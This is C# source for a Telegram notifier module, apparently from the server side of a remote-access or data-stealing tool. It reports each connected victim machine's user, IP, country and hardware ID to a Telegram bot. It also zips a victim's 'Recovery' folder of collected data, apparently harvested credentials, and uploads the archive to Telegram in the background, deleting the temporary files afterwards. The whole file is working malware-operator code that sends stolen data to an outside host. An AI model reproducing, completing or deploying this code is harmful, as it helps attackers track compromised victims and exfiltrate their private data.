using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Server.Connectings;

namespace Server.Helper;

public class TelegramNotificator
{
	private static string baseUrl = "https://api.telegram.org/bot{0}/sendMessage";

	private static string baseUrlDocument = "https://api.telegram.org/bot{0}/sendDocument";

	public static string Send(string message, string botToken, string chatId)
	{
		try
		{
			if (string.IsNullOrEmpty(botToken) || string.IsNullOrEmpty(chatId))
			{
				return "Error: BotToken or ChatID is empty";
			}
			string requestUriString = string.Format(baseUrl, botToken);
			StringBuilder jsonBuilder = new StringBuilder();
			jsonBuilder.Append("{\"chat_id\":\"").Append(EscapeJson(chatId)).Append("\",");
			jsonBuilder.Append("\"text\":\"").Append(EscapeJson(message)).Append("\",");
			jsonBuilder.Append("\"parse_mode\":\"HTML\",");
			jsonBuilder.Append("\"disable_web_page_preview\":true}");
			byte[] jsonBytes = Encoding.UTF8.GetBytes(jsonBuilder.ToString());
			HttpWebRequest request = (HttpWebRequest)WebRequest.Create(requestUriString);
			request.Method = "POST";
			request.ContentType = "application/json; charset=utf-8";
			request.ContentLength = jsonBytes.Length;
			request.Timeout = 30000;
			request.ReadWriteTimeout = 30000;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			using (Stream requestStream = request.GetRequestStream())
			{
				requestStream.Write(jsonBytes, 0, jsonBytes.Length);
			}
			using HttpWebResponse response = (HttpWebResponse)request.GetResponse();
			using StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
			return reader.ReadToEnd();
		}
		catch (Exception ex)
		{
			return "Error: " + ex.Message;
		}
	}

	public static void SendFormattedNotification(Clients client, string botToken, string chatId, bool isNewUser)
	{
		if (client != null && !string.IsNullOrEmpty(botToken) && !string.IsNullOrEmpty(chatId))
		{
			string hwid = client.Hwid ?? "Unknown";
			string userPc = client.UserMachine ?? "Unknown";
			string ip = client.RealIP ?? client.IP ?? "Unknown";
			string country = "Unknown";
			if (client.Tag is DataGridViewRow row && row.Cells.Count > 3)
			{
				country = row.Cells[3].Value?.ToString() ?? "Unknown";
			}
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(isNewUser ? "<b>\ud83c\udd95 New Client Connected!</b>" : "<b>\ud83d\udd04 Client Reconnected!</b>");
			stringBuilder.AppendLine("━━━━━━━━━━━━━━━━━━━━━━━━");
			stringBuilder.AppendLine("<b>\ud83d\udc64 User:</b> <code>" + userPc + "</code>");
			stringBuilder.AppendLine("<b>\ud83c\udf10 IP:</b> <code>" + ip + "</code>");
			stringBuilder.AppendLine("<b>\ud83d\udccd Country:</b> <code>" + country + "</code>");
			stringBuilder.AppendLine("<b>\ud83c\udd94 HWID:</b> <code>" + hwid + "</code>");
			stringBuilder.AppendLine("━━━━━━━━━━━━━━━━━━━━━━━━");
			stringBuilder.AppendLine($"<b>\ud83d\udcc5 Time:</b> {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
			stringBuilder.AppendLine(isNewUser ? "<b>✨ Type:</b> New User" : "<b>\ud83d\udcdd Type:</b> Old User");
			stringBuilder.AppendLine("<b>\ud83d\udce1 Status:</b> Online ✅");
			stringBuilder.AppendLine("━━━━━━━━━━━━━━━━━━━━━━━━");
			Send(stringBuilder.ToString(), botToken, chatId);
		}
	}

	public static void SendRecoveryWithNotification(string hwid, string userPc, string ip, string country, bool isNewUser, string recoveryPath, string botToken, string chatId)
	{
		if (string.IsNullOrEmpty(botToken) || string.IsNullOrEmpty(chatId) || !Directory.Exists(recoveryPath))
		{
			return;
		}
		ThreadPool.QueueUserWorkItem(delegate
		{
			try
			{
				Thread.Sleep(3000);
				if (Directory.GetFiles(recoveryPath, "*", SearchOption.AllDirectories).Length != 0)
				{
					string text = ((string.IsNullOrEmpty(hwid) || hwid == "Unknown") ? $"Recovery_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.zip" : $"{hwid}_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.zip");
					string text2 = Path.Combine(Path.GetTempPath(), text);
					if (File.Exists(text2))
					{
						File.Delete(text2);
					}
					ZipFile.CreateFromDirectory(recoveryPath, text2, CompressionLevel.Optimal, includeBaseDirectory: false);
					if (File.Exists(text2))
					{
						long num = new FileInfo(text2).Length / 1024;
						StringBuilder stringBuilder = new StringBuilder();
						stringBuilder.AppendLine(isNewUser ? "<b>\ud83c\udd95 New Client Connected!</b>" : "<b>\ud83d\udd04 Client Reconnected!</b>");
						stringBuilder.AppendLine("━━━━━━━━━━━━━━━━━━━━━━━━");
						stringBuilder.AppendLine("<b>\ud83d\udc64 User:</b> <code>" + userPc + "</code>");
						stringBuilder.AppendLine("<b>\ud83c\udf10 IP:</b> <code>" + ip + "</code>");
						stringBuilder.AppendLine("<b>\ud83d\udccd Country:</b> <code>" + country + "</code>");
						stringBuilder.AppendLine("<b>\ud83c\udd94 HWID:</b> <code>" + hwid + "</code>");
						stringBuilder.AppendLine("━━━━━━━━━━━━━━━━━━━━━━━━");
						stringBuilder.AppendLine("<b>\ud83c\udf81 Recovery Data Received!</b>");
						stringBuilder.AppendLine("<b>\ud83d\udce6 Archive:</b> <code>" + text + "</code>");
						stringBuilder.AppendLine($"<b>\ud83d\udcca Size:</b> <code>{num} KB</code>");
						stringBuilder.AppendLine("━━━━━━━━━━━━━━━━━━━━━━━━");
						stringBuilder.AppendLine($"<b>\ud83d\udcc5 Time:</b> {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
						stringBuilder.AppendLine(isNewUser ? "<b>✨ Type:</b> New User" : "<b>\ud83d\udcdd Type:</b> Old User");
						stringBuilder.AppendLine("<b>\ud83d\udce1 Status:</b> Online ✅");
						stringBuilder.AppendLine("━━━━━━━━━━━━━━━━━━━━━━━━");
						SendDocument(text2, stringBuilder.ToString(), botToken, chatId);
						if (File.Exists(text2))
						{
							File.Delete(text2);
						}
					}
				}
			}
			catch
			{
			}
		});
	}

	public static string SendDocument(string filePath, string caption, string botToken, string chatId)
	{
		try
		{
			if (string.IsNullOrEmpty(botToken) || string.IsNullOrEmpty(chatId))
			{
				return "Error: BotToken or ChatID is empty";
			}
			if (!File.Exists(filePath))
			{
				return "Error: File not found";
			}
			FileInfo fileInfo = new FileInfo(filePath);
			if (fileInfo.Length > 157286400)
			{
				return "Error: File too large (max 150MB)";
			}
			string requestUriString = string.Format(baseUrlDocument, botToken);
			string boundary = "----WebKitFormBoundary" + Guid.NewGuid().ToString("N");
			string fileName = Path.GetFileName(filePath);
			HttpWebRequest request = (HttpWebRequest)WebRequest.Create(requestUriString);
			request.Method = "POST";
			request.ContentType = "multipart/form-data; boundary=" + boundary;
			request.Timeout = 300000;
			request.ReadWriteTimeout = 300000;
			request.KeepAlive = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			byte[] boundaryStart = Encoding.UTF8.GetBytes("--" + boundary + "\r\n");
			byte[] boundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "\r\n");
			byte[] endBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n");
			string chatIdPart = "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId;
			byte[] chatIdBytes = Encoding.UTF8.GetBytes(chatIdPart);
			string parseModePart = "Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\nHTML";
			byte[] parseModeBytes = Encoding.UTF8.GetBytes(parseModePart);
			byte[] captionBytes = new byte[0];
			if (!string.IsNullOrEmpty(caption))
			{
				string captionPart = "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption;
				captionBytes = Encoding.UTF8.GetBytes(captionPart);
			}
			string filePart = "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"\r\nContent-Type: application/zip\r\n\r\n";
			byte[] filePartBytes = Encoding.UTF8.GetBytes(filePart);
			long contentLength = boundaryStart.Length + chatIdBytes.Length;
			contentLength += boundaryBytes.Length + parseModeBytes.Length;
			if (captionBytes.Length != 0)
			{
				contentLength += boundaryBytes.Length + captionBytes.Length;
			}
			contentLength += boundaryBytes.Length + filePartBytes.Length + fileInfo.Length + endBoundaryBytes.Length;
			request.ContentLength = contentLength;
			using (Stream requestStream = request.GetRequestStream())
			{
				requestStream.Write(boundaryStart, 0, boundaryStart.Length);
				requestStream.Write(chatIdBytes, 0, chatIdBytes.Length);
				requestStream.Write(boundaryBytes, 0, boundaryBytes.Length);
				requestStream.Write(parseModeBytes, 0, parseModeBytes.Length);
				if (captionBytes.Length != 0)
				{
					requestStream.Write(boundaryBytes, 0, boundaryBytes.Length);
					requestStream.Write(captionBytes, 0, captionBytes.Length);
				}
				requestStream.Write(boundaryBytes, 0, boundaryBytes.Length);
				requestStream.Write(filePartBytes, 0, filePartBytes.Length);
				byte[] buffer = new byte[65536];
				using (FileStream fileStream = File.OpenRead(filePath))
				{
					int bytesRead;
					while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) > 0)
					{
						requestStream.Write(buffer, 0, bytesRead);
					}
				}
				requestStream.Write(endBoundaryBytes, 0, endBoundaryBytes.Length);
			}
			using HttpWebResponse response = (HttpWebResponse)request.GetResponse();
			using StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
			return reader.ReadToEnd();
		}
		catch (Exception ex)
		{
			return "Error: " + ex.Message;
		}
	}

	public static void SendRecoveryFolder(string recoveryFolderPath, string caption, string botToken, string chatId)
	{
		ThreadPool.QueueUserWorkItem(delegate
		{
			try
			{
				if (!Directory.Exists(recoveryFolderPath) || Directory.GetFiles(recoveryFolderPath, "*", SearchOption.AllDirectories).Length == 0)
				{
					return;
				}
				string text = Path.Combine(Path.GetTempPath(), "Recovery_" + Guid.NewGuid().ToString("N") + ".zip");
				try
				{
					ZipFile.CreateFromDirectory(recoveryFolderPath, text, CompressionLevel.Fastest, includeBaseDirectory: false);
					if (File.Exists(text))
					{
						if (new FileInfo(text).Length == 0L)
						{
							File.Delete(text);
						}
						else
						{
							SendDocument(text, caption, botToken, chatId);
						}
					}
				}
				finally
				{
					if (File.Exists(text))
					{
						try
						{
							File.Delete(text);
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		});
	}

	private static string EscapeJson(string text)
	{
		if (string.IsNullOrEmpty(text))
		{
			return string.Empty;
		}
		StringBuilder sb = new StringBuilder(text.Length * 2);
		foreach (char c in text)
		{
			switch (c)
			{
			case '\\':
				sb.Append("\\\\");
				continue;
			case '"':
				sb.Append("\\\"");
				continue;
			case '\n':
				sb.Append("\\n");
				continue;
			case '\r':
				sb.Append("\\r");
				continue;
			case '\t':
				sb.Append("\\t");
				continue;
			case '\b':
				sb.Append("\\b");
				continue;
			case '\f':
				sb.Append("\\f");
				continue;
			}
			if (c < ' ')
			{
				sb.AppendFormat("\\u{0:X4}", (int)c);
			}
			else
			{
				sb.Append(c);
			}
		}
		return sb.ToString();
	}
}
